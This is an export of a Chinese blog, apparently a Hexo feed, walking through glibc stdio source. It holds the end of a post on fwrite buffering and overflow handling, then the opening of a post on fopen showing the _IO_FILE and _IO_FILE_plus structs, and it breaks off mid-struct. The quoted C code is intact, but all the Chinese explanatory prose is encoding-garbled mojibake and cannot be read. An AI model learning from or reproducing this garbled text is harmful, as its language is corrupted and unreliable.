æ˜¯è¿›ä¸å»çš„ï¼Œæ‰€ä»¥å°±ç›´æ¥returnäº†ã€‚ç¬¬äºŒç§æ˜¯å‰©ä½™çš„è¾“å‡ºç¼“å†²åŒºæ¯”æˆ‘ä»¬è¦è¾“å…¥çš„æ•°æ®å°ï¼Œä¹Ÿè¿›è¡Œmemcpyå‡½æ•°çš„æ‹·è´ï¼Œåªä¸è¿‡æ‹·è´åï¼Œå› ä¸ºè¿˜æœ‰æ•°æ®æ²¡æœ‰æ‹·è´è¿›è¾“å‡ºç¼“å†²åŒº(æ­¤æ—¶è¾“å‡ºç¼“å†²åŒºå·²ç»æ»¡äº†)ï¼Œé‚£å°±å»æ‰§è¡Œ_IO_new_file_overflowå‡½æ•°ï¼Œå®ƒæœ‰ä¿©ä½œç”¨ï¼Œå¦‚æœä¸å­˜åœ¨è¾“å‡ºç¼“å†²åŒºåˆ™ä¼šè¿›è¡Œåˆ›å»ºreserve areaï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œåˆ™ä¼šè°ƒç”¨_IO_do_writeå‡½æ•°è¿›è¡Œåˆ·æ–°ï¼Œç­‰åˆ·æ–°åå†å»æ‹·è´å‰©ä¸‹çš„æ•°æ®åˆ°è¾“å‡ºç¼“å†²åŒºã€‚ç„¶åè¿˜æœ‰ç¬¬ä¸‰ç§æƒ…å†µå°±æ˜¯æ­¤æ—¶å¹¶æ²¡æœ‰è¾“å‡ºç¼“å†²åŒºã€‚é‚£ä¹Ÿå»æ‰§è¡Œ_IO_new_file_overflowå‡½æ•°è¿›è¡Œåˆ›å»ºreserve areaï¼Œå†å»æ‹·è´æ•°æ®åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</p><p>ç¬¬ä¸€ç§æƒ…å†µä¸‹é¢çš„ä»£ç å†™çš„å¾ˆæ¸…æ¥šäº†ï¼Œå°±ä¸å†åˆ†æç¬¬ä¸€ç§æƒ…å†µã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§å’Œç¬¬ä¸‰ç§æƒ…å†µéƒ½ä¼šè¿›å…¥è¿™ä¸ªifä¸­ï¼ˆè¿™ä¸ªifçš„ä»£ç æˆ‘æ²¡æ”¾å…¨ï¼Œç­‰åˆ†æåˆ°ä¸‹é¢å†æ”¾ä¹‹åçš„éƒ¨åˆ†ï¼‰ï¼Œè¿›å…¥è¿™ä¸ªå‡½æ•°åå°±å»è°ƒç”¨äº†_IO_OVERFLOW (f, EOF)ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯vtableä¸­çš„_IO_new_file_overflowã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     _IO_size_t block_size, do_write;</span><br><span class="line">     <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br></pre></td></tr></table></figure><p>è¿›å…¥_IO_new_file_overflowå‡½æ•°(ä»£ç å¦‚ä¸‹)ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªå¯¹f-&gt;_IO_write_baseæ˜¯å¦ä¸ºç©ºçš„åˆ¤æ–­ï¼Œè€Œç¨‹åºé€šè¿‡è¿™ä¸ªåˆ¤æ–­æ¥åˆ¤å®šæ˜¯å¦æ²¡æœ‰åˆ†é…resever areaã€‚å¦‚æœæ²¡æœ‰åˆ†é…çš„è¯åˆ™å»æ‰§è¡Œ_IO_doallocbufå‡½æ•°æ¥åˆ†é…resever area(è¿™ä¸ªå‡½æ•°åœ¨<a href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">freadæºç åˆ†æ</a>ä¸­å·²ç»åˆ†æè¿‡äº†ï¼Œè¿™é‡Œå°±ä¸å†åˆ†æäº†)ï¼Œ_IO_setgè¿™ä¸ªå®çš„ä½œç”¨å°±æ˜¯å°†ä¸‰ä¸ªreadæŒ‡é’ˆå…¨éƒ¨èµ‹å€¼ä¸ºf-&gt;_IO_buf_base(f-&gt;_IO_buf_baseåœ¨_IO_doallocbufå‡½æ•°ä¸­å·²ç»è¢«åˆå§‹åŒ–è¿‡äº†)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">          <span class="comment">/* #define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="comment">(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ä»£ç ä¸€å®šè¦æ³¨æ„ï¼Œæ­¤å¤„æ˜¯å°†_IO_write_ptrå’Œ_IO_write_baseä¸¤ä¸ªæŒ‡é’ˆéƒ½åˆå§‹åŒ–ä¸ºäº†_IO_buf_baseçš„å€¼ï¼Œ<strong>ä½†_IO_write_endæŒ‡é’ˆå´æ˜¯åˆå§‹åŒ–ä¸ºäº†_IO_buf_end</strong>ï¼ˆreadçš„ä¸‰ä¸ªç›¸å…³æŒ‡é’ˆæ˜¯éƒ½è¢«åˆå§‹åŒ–ä¸ºäº†_IO_buf_baseï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">     f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">     f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">     f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">     f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">     f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br></pre></td></tr></table></figure><p>ç„¶åç”±äºå½“åˆè°ƒç”¨_IO_OVERFLOWå‡½æ•°çš„æ—¶å€™ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºEOF</p><p><img src="https://s2.loli.net/2022/08/12/KBfmDGZv7RVIsyh.png" alt="image-20220811182225383"></p><p>å› æ­¤_IO_new_file_overflowå‡½æ•°çš„chä¸ºEOF</p><p><img src="https://s2.loli.net/2022/08/12/N1sd9CWzrle6JfZ.png" alt="image-20220811182330917"></p><p>æ‰€ä»¥ä¸Šé¢å‡ ä¸ªæŒ‡é’ˆèµ‹å€¼è¿‡åï¼Œæ‰§è¡Œä¸‹é¢ifçš„æ—¶å€™å°±ç›´æ¥è¿›å…¥äº†,è°ƒç”¨äº†_IO_do_writeå‡½æ•°ï¼Œæ³¨æ„ä¸‹_IO_do_writeçš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœæ˜¯æ–°åˆ›å»ºçš„reserve areaï¼Œé‚£ä¹ˆ f-&gt;_IO_write_ptr - f-&gt;_IO_write_baseçš„å€¼åˆ™ä¸º0çš„ï¼ˆå¦‚ä¸‹ä»£ç ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p>å› ä¸ºåˆšæ‰è¯´è¿‡ï¼Œè¿™ä¸ªto_doå…¶å®å°±æ˜¯0ï¼Œå› æ­¤returnè¿”å›çš„æ—¶å€™å‘ç°to_do&#x3D;&#x3D;0æˆç«‹å¹¶ä¸”åé¢æ˜¯||ï¼Œå°±ç›´æ¥ä»_IO_new_do_writeå‡½æ•°è¿”å›äº†ï¼Œå¹¶æ²¡æœ‰å»æ‰§è¡Œåé¢çš„new_do_writeå‡½æ•°(å½“æ—¶åˆ†æåˆ°è¿™é‡Œï¼Œæˆ‘è¿˜ä¸ä¿¡ï¼Œäºæ˜¯å†™äº†ä¸ªdemoæµ‹è¯•äº†ä¸€ä¸‹å‘ç°ç¡®å®å¦‚æ­¤(å¦‚ä¸‹å›¾)ï¼‰<strong>æ³¨æ„:å‰é¢è®¨è®ºçš„æ˜¯æ–°åˆ›å»ºreserve areaæ‰§è¡Œåˆ°è¿™é‡Œçš„æƒ…å†µï¼Œå¦‚æœæ˜¯è¾“å‡ºç¼“å†²æœ‰æ•°æ®çš„è¯ï¼Œæ¥åˆ°è¿™é‡Œå°±ä¼šæ‰§è¡Œnew_do_writeå‡½æ•°ï¼Œä»è€Œè§¦å‘ç³»ç»Ÿè°ƒç”¨writeæ¥åˆ·æ–°è¾“å‡ºç¼“å†²åŒº(ä¸ä»…æ•°æ®è¢«åˆ·æ–°äº†å‡ºå»,åŒæ—¶_IO_write_ptræŒ‡é’ˆä¹Ÿè¿›è¡Œäº†æ›´æ–°)ã€‚</strong>æ€»ç»“ä¸€ä¸‹å°±æ˜¯_IO_new_do_writeå‡½æ•°å¯¹è¾“å‡ºç¼“å†²åŒºä¸­çš„æ•°æ®è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨æ•°æ®çš„è¯å°±è°ƒç”¨writeå‡½æ•°æ¥å°†è¾“å‡ºç¼“å†²åŒºä¸­çš„æ•°æ®å†™å…¥æ–‡ä»¶ï¼Œå¦åˆ™çš„è¯å°±ç›´æ¥è¿”å›ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/08/12/EBw1xTPb2yfiCDh.png" alt="image-20220811183408807" style="zoom:50%;" /><p>ç„¶åç¨‹åºä¸€ç›´è¿”å›åˆ°_IO_new_file_xsputnå‡½æ•°ï¼Œæ¥ä¸‹è¿™æ®µä»£ç å®ç°çš„æ˜¯å¦‚æœè¦å†™åˆ°æ–‡ä»¶é‡Œçš„æ•°æ®å¤§äºäº†reserve areaè¿™å—åŒºåŸŸ(é€šå¸¸æ˜¯0x1000,ä¹Ÿå°±æ˜¯4k)ï¼Œé‚£å°±å°†å¤§äºçš„éƒ¨åˆ†ç›´æ¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeè¾“å‡ºåˆ°æ–‡ä»¶ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†åˆ™å†™åˆ°è¾“å‡ºç¼“å†²åŒºä¸­ã€‚æ¯”å¦‚æˆ‘ä»¬è¦å†™10kçš„æ•°æ®åˆ°æ–‡ä»¶ä¸­ï¼Œè€Œreserve areä¸º4kï¼Œé‚£8kçš„æ•°æ®éƒ½å°†ç›´æ¥è¢«ç³»ç»Ÿè°ƒç”¨writeå†™å…¥æ–‡ä»¶ä¸­ï¼Œå¦å¤–2kçš„æ•°æ®æ”¾åˆ°è¾“å‡ºç¼“å†²åŒºä¸­ã€‚</p><p>ä¸Šè¿°åŠŸèƒ½çš„å®ç°æ ¸å¿ƒä»£ç å°±æ˜¯è¿™ä¸€è¡Œ<code>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</code>(ä¸å¾—ä¸è¯´ï¼Œè¿™ä¸€è¡Œå†™çš„æ˜¯çœŸå·§å¦™)ï¼Œå¦‚æœå†™å…¥çš„æ•°æ®é‡æœ¬èº«å°±å°äºreserve areaçš„è¯ï¼Œé‚£do_writeå°±ä¼šæ˜¯0ï¼Œä¹Ÿå°±æ— æ³•è¿›å…¥ä¸‹é¢é‚£ä¸ªifã€‚è€Œifä¸­çš„new_do_writeå‡½æ•°ä¸­æ‰§è¡Œäº†ç³»ç»Ÿè°ƒç”¨writeï¼Œå¹¶ä¸”é‡ç½®äº†_IO_write_ptræŒ‡é’ˆ(å¦‚ä¸‹å›¾)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">     do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/08/12/z5xYhPaUNspGkmI.png" alt="image-20220812213721975"></p><p>è¿™é‡Œä¹Ÿå°±æ˜¯å°†å¤§å—çš„æ•°æ®(å¤§äºreserve areaçš„æ•°æ®)å»ç›´æ¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeå†™å…¥æ–‡ä»¶ï¼Œè€Œå‰©ä½™çš„å°å—(å°äºreserve areaçš„æ•°æ®)æ‹·è´åˆ°è¾“å‡ºç¼“å†²åŒºä¸­ï¼ˆä¸‹é¢ä»£ç çš„_IO_default_xsputnå‡½æ•°è°ƒç”¨äº†æ‹·è´å‡½æ•°memcpyï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br></pre></td></tr></table></figure><p>_IO_default_xsputnå‡½æ•°çš„æºç å¦‚ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°åˆ†æèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚moreæ˜¯æˆ‘ä»¬éœ€è¦å†™å…¥æ–‡ä»¶çš„å­—èŠ‚æ•°ï¼Œcountæ˜¯è¾“å‡ºç¼“å†²åŒºå‰©ä½™çš„å­—èŠ‚æ•°ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦å†™å…¥æ–‡ä»¶çš„å­—èŠ‚æ•°å¤§äº20çš„è¯ï¼Œå°±æ‰§è¡Œmemcpyå‡½æ•°å»æ‹·è´ï¼Œå¦‚æœå°äº20çš„è¯ï¼Œå°±ç”¨forå¾ªç¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„æ‹·è´(è¿™ä¸ªç­–ç•¥åº”è¯¥æ˜¯æ•ˆç‡æ¯”è¾ƒé«˜çš„)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">    count = more;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">      _IO_ssize_t i;</span><br><span class="line">      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">*p++ = *s++;</span><br><span class="line">      f-&gt;_IO_write_ptr = p;</span><br><span class="line">    &#125;</span><br><span class="line">  more -= count;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œæ•´ä¸ªfwriteå‡½æ•°ä¹Ÿå°±ç®—æ˜¯ç»“æŸäº†ã€‚</p><h2 id="æ€»ç»“fwriteå‡½æ•°çš„è°ƒç”¨æµç¨‹ï¼š"><a href="#æ€»ç»“fwriteå‡½æ•°çš„è°ƒç”¨æµç¨‹ï¼š" class="headerlink" title="æ€»ç»“fwriteå‡½æ•°çš„è°ƒç”¨æµç¨‹ï¼š"></a>æ€»ç»“fwriteå‡½æ•°çš„è°ƒç”¨æµç¨‹ï¼š</h2><p>å…ˆå°è¯•å°†æ•°æ®æ‹·è´åˆ°è¾“å‡ºç¼“å†²åŒºï¼Œå¦‚æœå…¨éƒ¨éƒ½æ‹·è´è¿‡å»çš„è¯å‡½æ•°å°±ç›´æ¥è¿”å›ã€‚å¦‚æœåªæ‹·è´è¿‡å»äº†ä¸€éƒ¨åˆ†æ•°æ®ï¼Œå¦å¤–ä¸€éƒ¨åˆ†æ•°æ®å› ä¸ºè¾“å‡ºç¼“å†²åŒºæ»¡çš„è¯åˆæˆ–è€…æ²¡æœ‰åˆ†é…reserve areaçš„è¯éƒ½è°ƒç”¨_IO_new_file_overflowå‡½æ•°ï¼Œç„¶åè¿™ä¸ªå‡½æ•°ä¼šæ–°åˆ›å»ºä¸€ä¸ªreserve areaæˆ–è€…æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeåˆ·æ–°è¾“å‡ºç¼“å†²åŒºã€‚æœ€åæ¥åˆ¤æ–­è¦å†™å…¥çš„å­—èŠ‚æ•°æ˜¯å¦å°äºreserve areaï¼Œå¦‚æœå°äºçš„è¯åˆ™å°†æ•°æ®æ‹·è´åˆ°è¾“å‡ºç¼“å†²åŒºä¸­ï¼Œå¦‚æœå¤§äºçš„è¯åˆ™å°†å¤§äºéƒ¨åˆ†ç”¨ç³»ç»Ÿè°ƒç”¨writeå†™å…¥æ–‡ä»¶å‰©ä½™éƒ¨åˆ†å†æ‹·è´åˆ°è¾“å‡ºç¼“å†²åŒºã€‚<strong>æ³¨æ„ï¼šè¿™ä¸ªdemoç¨‹åºçš„è¯ï¼Œè°ƒè¯•åˆ°fwriteå‡½æ•°ç»“æŸä¹Ÿæ²¡æœ‰å‘ç°ç³»ç»Ÿè°ƒç”¨äº†writeï¼Œè¿™æ˜¯å› ä¸ºè¾“å‡ºç¼“å†²åŒºå°†åœ¨ç¨‹åºç»“æŸæ—¶çš„exitå‡½æ•°ä¸­çš„_IO_cleanupå‡½æ•°è°ƒç”¨_IO_flush_all_lockpå‡½æ•°æ—¶è¿›è¡Œåˆ·æ–°ï¼Œæ­¤æ—¶æ‰ä¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨write</strong></p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fwrite">FILEç»“æ„ä½“åŠæ¼æ´åˆ©ç”¨æ–¹æ³• | Hacked By Fish_o0O (fish-o0o.github.io)</a></p><p><a href="https://tttang.com/archive/1279/#toc__1">IO FILEä¹‹fwriteè¯¦è§£ - è·³è·³ç³– (tttang.com)</a></p><p><a href="http://blog.leanote.com/post/mut3p1g/file-struct"> (leanote.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> æºç è°ƒè¯•&amp;&amp;åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æºç è°ƒè¯•&amp;&amp;åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOå­¦ä¹ --æºç è°ƒè¯•fopenå‡½æ•°</title>
      <link href="/posts/ce09b1a.html"/>
      <url>/posts/ce09b1a.html</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢ï¼š"><a href="#å†™åœ¨å‰é¢ï¼š" class="headerlink" title="å†™åœ¨å‰é¢ï¼š"></a>å†™åœ¨å‰é¢ï¼š</h2><p>è¿™ç¯‡æ–‡ç« æ˜¯å­¦ä¹ IOï¼Œè¿›è¡Œæºç åˆ†æå››éƒ¨æ›²ä¸­çš„ç¬¬ä¸€ç¯‡ï¼Œæœ¬ç¯‡ä¸»è¦å°±æ˜¯<strong>æºç è°ƒè¯•fopenå‡½æ•°</strong>ï¼Œå¹¶<strong>æ²¡æœ‰å•ç‹¬å¯¹fopenå‡½æ•°çš„æºç ä¸“é—¨é˜…è¯»åˆ†æ</strong>(ä¹‹åçš„ä¸‰ç¯‡åŸºæœ¬ä¸Šæ˜¯æºç åˆ†æ)ã€‚å¦‚æœè¦çœ‹fopenå‡½æ•°æºç åˆ†æçš„è¯å¯ä»¥å»çœ‹ä¸‹æ–‡æœ«çš„å‚è€ƒæ–‡ç« (å¸ˆå‚…ä»¬å†™çš„éƒ½éå¸¸å¥½è¯¶)</p><p>è¿™é‡Œæˆ‘å†™äº†ä¸€ç¯‡å…³äºåˆå­¦è€…åº”è¯¥å¦‚ä½•å»è¯»glibcæºç çš„æ–‡ç« (å¸Œæœ›å¯ä»¥å¸®åŠ©åˆ°åˆšåˆšå…¥é—¨çš„å¸ˆå‚…ä»¬) <a href="https://www.cnblogs.com/ZIKH26/articles/16582817.html">here</a></p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="IO-FILE-plusç»“æ„ä½“"><a href="#IO-FILE-plusç»“æ„ä½“" class="headerlink" title="_IO_FILE_plusç»“æ„ä½“"></a>_IO_FILE_plusç»“æ„ä½“</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>_IO_FILE_plusç»“æ„åŒ…å«äº†_IO_FILEç»“æ„ä½“å’Œ _IO_jump_t ç»“æ„ä½“ã€‚</p><h3 id="IO-FILEç»“æ„ä½“"><a href="#IO-FILEç»“æ„ä½“" class="headerlink" title="_IO_FILEç»“æ„ä½“"></a>_IO_FILEç»“æ„ä½“</h3><p>å…ˆè¯´_IO_FILEç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å°±æ˜¯æ ‡å‡†IOåº“ä¸­ç”¨æ¥æè¿°æ–‡ä»¶çš„ç»“æ„ï¼Œåœ¨ç¨‹åºæ‰§è¡Œfopenå‡½æ•°æ—¶ä¼šåˆ›å»ºè¯¥ç»“æ„ï¼Œå¹¶åˆ†é…åœ¨å †ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span> </span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> 